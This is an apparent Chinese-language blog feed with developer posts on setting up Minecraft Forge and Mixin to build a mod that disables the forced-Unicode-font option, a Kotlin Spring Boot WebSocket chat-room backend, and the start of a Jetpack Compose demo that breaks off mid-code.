        <content type="html"><![CDATA[<h1 id="Hello-Minecraft-Forge-amp-Mixin"><a href="#Hello-Minecraft-Forge-amp-Mixin" class="headerlink" title="Hello Minecraft Forge &amp; Mixin!"></a>Hello Minecraft Forge &amp; Mixin!</h1><blockquote><p>起因经过大概是斯帕克那边需要一个模组来禁止玩家开启 强制使用Unicode字体 这一选项来确保材质包的体验效果</p><p>行吧，以前虽然完全没有了解过Forge开发，还是只有硬着头皮上了呗</p></blockquote><h2 id="Forge环境搭建"><a href="#Forge环境搭建" class="headerlink" title="Forge环境搭建"></a>Forge环境搭建</h2><blockquote><p>老大难了，Forge Mod的开发者之所以明显少于Bukkit插件开发者也许就是因为这位拦路虎吧</p><p>不仅难，社区的有关教程也特别少 （我知道有很多1.12的环境搭建教程，但1.16版本的forge教程简直是一片荒原</p><p>而由于网络原因（众所周知），老外的那套官方教程很多地方对我们不适用</p><p>庆幸我最开始学习的是Bukkit开发，如果当时我选择学习forge mod开发，多半会倒在环境搭建这座大山前</p></blockquote><p>最开始我试图使用forge官方提供的ForgeGradle mdk快速完成开发环境的搭建，最后我发现即使我能够科学上网，有的东西gradle一样拉不下来</p><p>怎么办？于是我上mcbbs寻求帮助，发现了耗子大佬的[<a href="https://www.mcbbs.net/thread-896542-1-1.html">1.17.1-1.7.10] Minecraft模组开发离线包 [Forge|Fabric] - 编程开发 - Minecraft(我的世界)中文论坛 - (mcbbs.net)</a>于是我下载并部署了耗子大佬的gradle依赖离线包。</p><p>到这里我便具备了一个Forge开发者的基本开发环境</p><p>但如果仅仅到这里就结束，我也不会说他难了</p><p>真正的重头戏，还在后头</p><h2 id="Mixin环境搭建"><a href="#Mixin环境搭建" class="headerlink" title="Mixin环境搭建"></a>Mixin环境搭建</h2><blockquote><p>Mixin是SpongePowered开发的一套基于javaagent和asm框架的字节码操作框架，有了Mixin，开发者可以摆脱繁琐的传统字节码插桩操作，以一种非常简洁直观的方式修改Minecraft客户端的底层逻辑代码</p><p>而不同于Bukkit API竭力阻止开发者利用服务端原生特性，主张一切插件应该完全在Bukkit API的基础上实现</p><p>Forge API的设计是完全信任开发者的，鼓励开发者修改客户端底层逻辑代码来实现自己想要的特性，甚至Forge准确来说不能被称为一种API，而是模组开发者与客户端底层代码的一层兼容层。</p><p>所以说，Forge和Mixin可谓是天作之合，从Forge1.16版本开始，Forge开始原生附带Mixin环境</p><p>而这一切，得益于Mojang官方公布了客户端的混淆表。Minecraft作为一款商业游戏，公布混淆表无疑是一种巨大的牺牲。但我相信，正是这个英明的决策，刺激了广大模组开发者的开发热情，让各色Minecraft模组在社区中遍地生根，让Minecraft成为如此一款伟大的游戏。</p><p>所以在Forge开发中，我们看到的大部分客户端底层代码都是具有相当程度的可读性的。</p><p>而使用Mixin，可以让我们以最高效的方式修改底层代码，实现一些以前在做Bukkit开发时连想都不敢想的魔法般的特性</p><p>那么Mixin的环境搭建，上面我说的重头戏</p></blockquote><p>最开始我以为Mixin是不需要配置，开箱即用的。结果把编译出来的模组跑了一遍又一遍，发现Mixin没有起任何作用</p><p>我尝试在网络上搜索Mixin环境搭建教程，却发现除了耗子大佬的[<a href="https://www.mcbbs.net/thread-833646-1-1.html">未知之域][翻译]Mixin官方文档翻译——深度修改Minecraft的利器 - 编程开发 - Minecraft(我的世界)中文论坛 - (mcbbs.net)</a>，一篇有价值的文章也找不出来。</p><p>我在耗子大佬的官方文档翻译中学习了Mixin的使用方法，但它并没有详细的告诉我如何搭建环境。</p><p>于是我想起来，坏黑曾经写过一个1.16的Forge Mod，我是不是可以参考他的源码来招猫画虎呢</p><p>同时我也想起来海螺的博客似乎也提到过这玩意，然后在这上面找到了官方的release note</p><p><a href="https://izzel.io/2020/02/06/mixin-0-8-guide/">关于 Mixin 升级到 0.8 和 ModLauncher 的那些事 | IzzelAliz’s Blog</a></p><p><a href="https://github.com/SpongePowered/Mixin/wiki/Release-Notes---Mixin-0.8">Release Notes Mixin 0.8 · SpongePowered/Mixin Wiki (github.com)</a></p><p>于是依靠上面这些，我基本搭建起了一个Mixin环境</p><blockquote><p>难点基本如下</p><p>1.MixinConnector</p><p>2.MixinRefmap文件</p><p>3.MixinAnnoationProcessor</p><p>4.Mixin配置文件</p><p>额外需要注意的是，Mixin配置文件中指定的Mixin Pakage不能指定位模组主类所在包，这样会导致模组无法加载</p></blockquote><p>虽然有些晚了，但我还是把问题解决之后找到的相关资料放在这里</p><p><a href="https://github.com/mouse0w0/forge-mixin-example">mouse0w0/forge-mixin-example: An example for using Mixin in Minecraft Forge 1.12.2 (github.com)</a></p><h2 id="功能实现"><a href="#功能实现" class="headerlink" title="功能实现"></a>功能实现</h2><p>毕竟也不是教程，杂谈而已，就不写使用教程了</p><p>这里只放出实现功能的Mixin代码</p><h3 id="我的做法"><a href="#我的做法" class="headerlink" title="我的做法"></a>我的做法</h3><p>锁掉底层选项实际boolean值，使玩家不论如何更改选项都以非强制Unicode字体方式渲染字体</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">me<span class="token punctuation">.</span>asgard<span class="token punctuation">.</span>rain<span class="token punctuation">.</span>afu<span class="token punctuation">.</span>mixin</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>google<span class="token punctuation">.</span>common<span class="token punctuation">.</span>collect<span class="token punctuation">.</span></span><span class="token class-name">ImmutableMap</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">net<span class="token punctuation">.</span>minecraft<span class="token punctuation">.</span>client<span class="token punctuation">.</span></span><span class="token class-name">Minecraft</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">net<span class="token punctuation">.</span>minecraft<span class="token punctuation">.</span>client<span class="token punctuation">.</span>gui<span class="token punctuation">.</span>fonts<span class="token punctuation">.</span></span><span class="token class-name">FontResourceManager</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>spongepowered<span class="token punctuation">.</span>asm<span class="token punctuation">.</span>mixin<span class="token punctuation">.</span></span><span class="token class-name">Final</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>spongepowered<span class="token punctuation">.</span>asm<span class="token punctuation">.</span>mixin<span class="token punctuation">.</span></span><span class="token class-name">Mixin</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>spongepowered<span class="token punctuation">.</span>asm<span class="token punctuation">.</span>mixin<span class="token punctuation">.</span></span><span class="token class-name">Overwrite</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>spongepowered<span class="token punctuation">.</span>asm<span class="token punctuation">.</span>mixin<span class="token punctuation">.</span></span><span class="token class-name">Shadow</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span><span class="token comment">/** * me.asgard.rain.afu.GameSettingMixin * AntiForceUnicode * * @author 寒雨 * @since 2021/12/29 13:48 **/</span><span class="token annotation punctuation">@Mixin</span><span class="token punctuation">(</span><span class="token class-name">Minecraft</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">MinecraftMixin</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Final</span>    <span class="token annotation punctuation">@Shadow</span>    <span class="token keyword">private</span> <span class="token class-name">FontResourceManager</span> fontManager<span class="token punctuation">;</span>    <span class="token comment">/**     * @author Rain     * @reason force disable force unicode     */</span>    <span class="token annotation punctuation">@Overwrite</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isEnforceUnicode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">/**     * @author Rain     * @reason force disable force unicode     */</span>    <span class="token annotation punctuation">@Overwrite</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">selectMainFont</span><span class="token punctuation">(</span><span class="token keyword">boolean</span> p_238209_1_<span class="token punctuation">)</span> <span class="token punctuation">{</span>        fontManager<span class="token punctuation">.</span><span class="token function">setRenames</span><span class="token punctuation">(</span><span class="token class-name">ImmutableMap</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="坏黑的做法"><a href="#坏黑的做法" class="headerlink" title="坏黑的做法"></a>坏黑的做法</h3><p>写成一天后坏黑大概是来兴趣了，也写了一个</p><p>他直接把那个选项的按钮删掉了。毫无疑问，这个做法更好</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">me<span class="token punctuation">.</span>skymc<span class="token punctuation">.</span>fsb<span class="token punctuation">.</span>mixin</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">net<span class="token punctuation">.</span>minecraft<span class="token punctuation">.</span>client<span class="token punctuation">.</span></span><span class="token class-name">AbstractOption</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">net<span class="token punctuation">.</span>minecraft<span class="token punctuation">.</span>client<span class="token punctuation">.</span>gui<span class="token punctuation">.</span>screen<span class="token punctuation">.</span></span><span class="token class-name">Screen</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">net<span class="token punctuation">.</span>minecraft<span class="token punctuation">.</span>client<span class="token punctuation">.</span>gui<span class="token punctuation">.</span>widget<span class="token punctuation">.</span></span><span class="token class-name">Widget</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">net<span class="token punctuation">.</span>minecraft<span class="token punctuation">.</span>client<span class="token punctuation">.</span>gui<span class="token punctuation">.</span>widget<span class="token punctuation">.</span>button<span class="token punctuation">.</span></span><span class="token class-name">OptionButton</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>spongepowered<span class="token punctuation">.</span>asm<span class="token punctuation">.</span>mixin<span class="token punctuation">.</span></span><span class="token class-name">Mixin</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>spongepowered<span class="token punctuation">.</span>asm<span class="token punctuation">.</span>mixin<span class="token punctuation">.</span>injection<span class="token punctuation">.</span></span><span class="token class-name">At</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>spongepowered<span class="token punctuation">.</span>asm<span class="token punctuation">.</span>mixin<span class="token punctuation">.</span>injection<span class="token punctuation">.</span></span><span class="token class-name">Inject</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>spongepowered<span class="token punctuation">.</span>asm<span class="token punctuation">.</span>mixin<span class="token punctuation">.</span>injection<span class="token punctuation">.</span>callback<span class="token punctuation">.</span></span><span class="token class-name">CallbackInfoReturnable</span><span class="token punctuation">;</span><span class="token comment">/** * FSB * me.skymc.fsb.mixin.MixinScreenLanguage * * @author 坏黑 * @since 2021/12/29 10:54 PM */</span><span class="token annotation punctuation">@Mixin</span><span class="token punctuation">(</span><span class="token class-name">Screen</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">MixinLanguageScreen</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Inject</span><span class="token punctuation">(</span>method <span class="token operator">=</span> <span class="token string">"addButton"</span><span class="token punctuation">,</span> at <span class="token operator">=</span> <span class="token annotation punctuation">@At</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"HEAD"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> cancellable <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">)</span>    <span class="token keyword">protected</span> <span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span> <span class="token keyword">extends</span> <span class="token class-name">Widget</span><span class="token punctuation">&gt;</span></span> <span class="token keyword">void</span> <span class="token function">addButton</span><span class="token punctuation">(</span><span class="token class-name">T</span> p_230480_1_<span class="token punctuation">,</span> <span class="token class-name">CallbackInfoReturnable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> c<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>p_230480_1_ <span class="token keyword">instanceof</span> <span class="token class-name">OptionButton</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">OptionButton</span><span class="token punctuation">)</span> p_230480_1_<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getOption</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token class-name">AbstractOption</span><span class="token punctuation">.</span>FORCE_UNICODE_FONT<span class="token punctuation">)</span> <span class="token punctuation">{</span>            c<span class="token punctuation">.</span><span class="token function">setReturnValue</span><span class="token punctuation">(</span>p_230480_1_<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Minecraft </tag>
            
            <tag> Forge模组开发 </tag>
            
            <tag> 字节码操作 </tag>
            
            <tag> Mixin </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello Spring Boot!</title>
      <link href="/2021/12/25/hello-spring-boot/"/>
      <url>/2021/12/25/hello-spring-boot/</url>
      
        <content type="html"><![CDATA[<h1 id="Hello-Spring-Boot"><a href="#Hello-Spring-Boot" class="headerlink" title="Hello Spring Boot"></a>Hello Spring Boot</h1><p>其实之前也有了解过其他的后端实现方式，比如Go的后端（还没学到怎么写接口就放弃了），Node.js的后端（还是整得稀里糊涂的），发现都学不太会。（其实是没时间去仔细琢磨，学习这些语言的后端同时也需要学习这些语言，学习成本较大）</p><p>于是我还是选择了最传统的Spring Boot后端。不过我使用了我喜欢的Kotlin语言来编写，使用Gradle工具来管理依赖库。</p><p>刚上手时便惊讶的发现，Spring Boot框架对java后端的封装真的特别彻底，基本就是几个注解便帮你处理了大部分工作，写起来真的特别的舒服。</p><p>像这样便能实现一个简单的返回json信息的api接口</p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token annotation builtin">@RestController</span><span class="token keyword">class</span> TestController <span class="token punctuation">{</span>    <span class="token annotation builtin">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/greeting"</span><span class="token punctuation">)</span>    <span class="token keyword">fun</span> <span class="token function">greeting</span><span class="token punctuation">(</span><span class="token annotation builtin">@RequestParam</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"name"</span><span class="token punctuation">,</span> defaultValue <span class="token operator">=</span> <span class="token string">"World"</span><span class="token punctuation">)</span> name<span class="token operator">:</span> String<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">BaseResponseBean</span><span class="token punctuation">(</span><span class="token string">"Hello <span class="token interpolation variable">$name</span>"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">data</span> <span class="token keyword">class</span> BaseResponseBean<span class="token operator">&lt;</span>T<span class="token operator">&gt;</span><span class="token punctuation">(</span>    <span class="token keyword">val</span> <span class="token keyword">data</span><span class="token operator">:</span> T<span class="token operator">?</span><span class="token punctuation">,</span>    <span class="token keyword">val</span> errorCode<span class="token operator">:</span> Int <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>    <span class="token keyword">val</span> errorMsg<span class="token operator">:</span> String <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后我便想写个项目练练手，于是就想到了路姐姐的聊天室后端。路姐姐是用的TypeScript实现的聊天室后端，我便想用Spring Boot实现一个功能类似的。</p><p>代码如下</p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token keyword">data</span> <span class="token keyword">class</span> <span class="token function">ChatWsMessageBean</span><span class="token punctuation">(</span>    <span class="token keyword">val</span> type<span class="token operator">:</span> String<span class="token punctuation">,</span>    <span class="token keyword">val</span> username<span class="token operator">:</span> String<span class="token punctuation">,</span>    <span class="token keyword">val</span> <span class="token keyword">data</span><span class="token operator">:</span> String<span class="token operator">?</span><span class="token punctuation">,</span>    <span class="token keyword">val</span> avatar<span class="token operator">:</span> String<span class="token punctuation">)</span><span class="token keyword">object</span> WebSocketMessageType <span class="token punctuation">{</span>    <span class="token keyword">const</span> <span class="token keyword">val</span> OPEN <span class="token operator">=</span> <span class="token string">"OPEN"</span>    <span class="token keyword">const</span> <span class="token keyword">val</span> CLOSE <span class="token operator">=</span> <span class="token string">"CLOSE"</span>    <span class="token keyword">const</span> <span class="token keyword">val</span> MESSAGE <span class="token operator">=</span> <span class="token string">"MESSAGE"</span><span class="token punctuation">}</span><span class="token annotation builtin">@Component</span><span class="token keyword">class</span> ChatRoomWsHandler <span class="token operator">:</span> <span class="token function">TextWebSocketHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">val</span> objectMapper <span class="token operator">=</span> <span class="token function">ObjectMapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> <span class="token keyword">val</span> connectedSessions <span class="token operator">=</span> arrayListOf<span class="token operator">&lt;</span>WebSocketSession<span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">afterConnectionEstablished</span><span class="token punctuation">(</span>session<span class="token operator">:</span> WebSocketSession<span class="token punctuation">)</span> <span class="token punctuation">{</span>        connectedSessions<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span>        <span class="token keyword">val</span> username <span class="token operator">=</span> session<span class="token punctuation">.</span>attributes<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token operator">?:</span> <span class="token string">"unnamed"</span>        <span class="token keyword">val</span> avatar <span class="token operator">=</span> session<span class="token punctuation">.</span>attributes<span class="token punctuation">[</span><span class="token string">"avatar"</span><span class="token punctuation">]</span> <span class="token operator">?:</span> <span class="token string">"https://i0.hdslb.com/bfs/face/member/noface.jpg@240w_240h_1c_1s.webp"</span>        connectedSessions<span class="token punctuation">.</span><span class="token function">forEach</span> <span class="token punctuation">{</span> it<span class="token punctuation">.</span><span class="token function">sendMessage</span><span class="token punctuation">(</span><span class="token function">TextMessage</span><span class="token punctuation">(</span><span class="token function">ChatWsMessageBean</span><span class="token punctuation">(</span>WebSocketMessageType<span class="token punctuation">.</span>OPEN<span class="token punctuation">,</span> username<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> avatar<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">}</span>        <span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"[ChatRoom] <span class="token interpolation variable">$username</span> connect with avatar <span class="token interpolation variable">$avatar</span>"</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">handleTextMessage</span><span class="token punctuation">(</span>session<span class="token operator">:</span> WebSocketSession<span class="token punctuation">,</span> message<span class="token operator">:</span> TextMessage<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">val</span> username <span class="token operator">=</span> session<span class="token punctuation">.</span>attributes<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token operator">?:</span> <span class="token string">"unnamed"</span>        <span class="token keyword">val</span> avatar <span class="token operator">=</span> session<span class="token punctuation">.</span>attributes<span class="token punctuation">[</span><span class="token string">"avatar"</span><span class="token punctuation">]</span> <span class="token operator">?:</span> <span class="token string">"https://i0.hdslb.com/bfs/face/member/noface.jpg@240w_240h_1c_1s.webp"</span>        connectedSessions<span class="token punctuation">.</span><span class="token function">forEach</span> <span class="token punctuation">{</span>            it<span class="token punctuation">.</span><span class="token function">sendMessage</span><span class="token punctuation">(</span><span class="token function">TextMessage</span><span class="token punctuation">(</span><span class="token function">ChatWsMessageBean</span><span class="token punctuation">(</span>WebSocketMessageType<span class="token punctuation">.</span>MESSAGE<span class="token punctuation">,</span> username<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                message<span class="token punctuation">.</span>payload<span class="token punctuation">,</span> avatar<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>        <span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"[ChatRoom] <span class="token interpolation variable">$username</span> send message <span class="token interpolation"><span class="token delimiter variable">${</span>message<span class="token punctuation">.</span>payload<span class="token delimiter variable">}</span></span> with avatar <span class="token interpolation variable">$avatar</span>"</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">afterConnectionClosed</span><span class="token punctuation">(</span>session<span class="token operator">:</span> WebSocketSession<span class="token punctuation">,</span> closeStatus<span class="token operator">:</span> CloseStatus<span class="token punctuation">)</span> <span class="token punctuation">{</span>        connectedSessions<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span>        <span class="token keyword">val</span> username <span class="token operator">=</span> session<span class="token punctuation">.</span>attributes<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token operator">?:</span> <span class="token string">"unnamed"</span>        <span class="token keyword">val</span> avatar <span class="token operator">=</span> session<span class="token punctuation">.</span>attributes<span class="token punctuation">[</span><span class="token string">"avatar"</span><span class="token punctuation">]</span> <span class="token operator">?:</span> <span class="token string">"https://i0.hdslb.com/bfs/face/member/noface.jpg@240w_240h_1c_1s.webp"</span>        connectedSessions<span class="token punctuation">.</span><span class="token function">forEach</span> <span class="token punctuation">{</span> it<span class="token punctuation">.</span><span class="token function">sendMessage</span><span class="token punctuation">(</span><span class="token function">TextMessage</span><span class="token punctuation">(</span><span class="token function">ChatWsMessageBean</span><span class="token punctuation">(</span>WebSocketMessageType<span class="token punctuation">.</span>CLOSE<span class="token punctuation">,</span> username<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> avatar<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">}</span>        <span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"[ChatRoom] <span class="token interpolation variable">$username</span> disconnect with avatar <span class="token interpolation variable">$avatar</span>"</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">fun</span> ChatWsMessageBean<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> objectMapper<span class="token punctuation">.</span><span class="token function">writeValueAsString</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token annotation builtin">@Configuration</span><span class="token annotation builtin">@EnableWebSocket</span><span class="token keyword">class</span> WebSocketConfig <span class="token operator">:</span> WebSocketConfigurer <span class="token punctuation">{</span>    <span class="token annotation builtin">@Autowired</span>    <span class="token keyword">private</span> <span class="token keyword">lateinit</span> <span class="token keyword">var</span> chatRoomWsHandler<span class="token operator">:</span> ChatRoomWsHandler    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">registerWebSocketHandlers</span><span class="token punctuation">(</span>registry<span class="token operator">:</span> WebSocketHandlerRegistry<span class="token punctuation">)</span> <span class="token punctuation">{</span>        registry<span class="token punctuation">.</span><span class="token function">addHandler</span><span class="token punctuation">(</span>chatRoomWsHandler<span class="token punctuation">,</span> <span class="token string">"chatroom"</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">setAllowedOrigins</span><span class="token punctuation">(</span><span class="token string">"*"</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对其效果个人还是非常满意的，改天有时间写一个Android端的聊天室</p><p>在全栈的道路上越走越远XD</p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kotlin </tag>
            
            <tag> 后端 </tag>
            
            <tag> SpringBoot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初试Jetpack Compose</title>
      <link href="/2021/12/24/jetpack-compose-test/"/>
      <url>/2021/12/24/jetpack-compose-test/</url>
      
        <content type="html"><![CDATA[<h1 id="初试Jetpack-Compose"><a href="#初试Jetpack-Compose" class="headerlink" title="初试Jetpack Compose"></a>初试Jetpack Compose</h1><p>今天写WanAndroid写得头晕目眩，便想换换脑子学点别的东西，于是我去了解了一下<em><strong>Jetpack Compose</strong></em>。并尝试用它仿写了Github App的部分内容。</p><p>我一向是对DSL风格的编程十分向往的，因为我感觉这样写代码就跟写诗一样优雅。而UI编程其实一直是我的痛点。曾经在Minecraft插件开发中，我是很不擅长编写UI的。所幸Android提供了一套xml语法糖来将大部分UI逻辑与逻辑代码分离，让我对Android的ui开发还算得心应手，但我仍然十分向往使用逻辑代码来构造UI界面。于是我听说了Jetpack Compose，一种使用DSL风格的Jetpack UI框架，直接戳爆了我。</p><p>于是在一个上午，我被我写的WanAndroid的代码恶心得死去活来，气得关闭了Android Studio。想着刷刷掘金，看到了一篇Compose的文章，于是就学了一上午的Compose，然后有了这个demo。</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token keyword">class</span> MainActivity <span class="token operator">:</span> <span class="token function">ComponentActivity</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">onCreate</span><span class="token punctuation">(</span>savedInstanceState<span class="token operator">:</span> Bundle<span class="token operator">?</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">onCreate</span><span class="token punctuation">(</span>savedInstanceState<span class="token punctuation">)</span>        setContent <span class="token punctuation">{</span>            <span class="token function">ComposeTestTheme</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">Main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token annotation builtin">@Composable</span>    <span class="token keyword">fun</span> <span class="token function">Main</span><span class="token punctuation">(</span>        avatar<span class="token operator">:</span> String <span class="token operator">=</span> <span class="token string">"https://gitee.com/coldrain-moro/images_bed/raw/master/images/chino.jpg"</span><span class="token punctuation">,</span>    <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">var</span> selectedItem <span class="token keyword">by</span> remember <span class="token punctuation">{</span> <span class="token function">mutableStateOf</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span 